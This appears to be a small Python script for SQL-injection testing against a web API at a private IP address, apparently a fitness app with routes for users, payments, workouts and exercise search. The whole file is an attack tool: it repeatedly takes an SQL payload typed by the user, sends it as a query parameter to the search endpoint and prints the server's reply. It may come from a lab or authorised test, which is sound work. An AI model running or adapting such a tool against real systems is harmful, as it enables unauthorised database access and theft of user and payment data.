import requests

#Base URL for the application under attack:
base_url = 'http://192.168.15.100:3333/'

#Possible attack routes
routes = ['auth/login', 'auth/profile', 'payments', 'users', 'users/coach', 'workouts', 'exercises', 'exercises/search']

while True:
    sql_payload = input('Type you SQL command to attack: ')
    params = {'value': sql_payload}
    try:
        response = requests.get(base_url + routes[7], params=params, timeout=10)
        print(f'Status Code: {response.status_code}')
        print(f'Response: \n{response.text}')
    except requests.exceptions.RequestException as e:
        print(f'Error:\n{e}')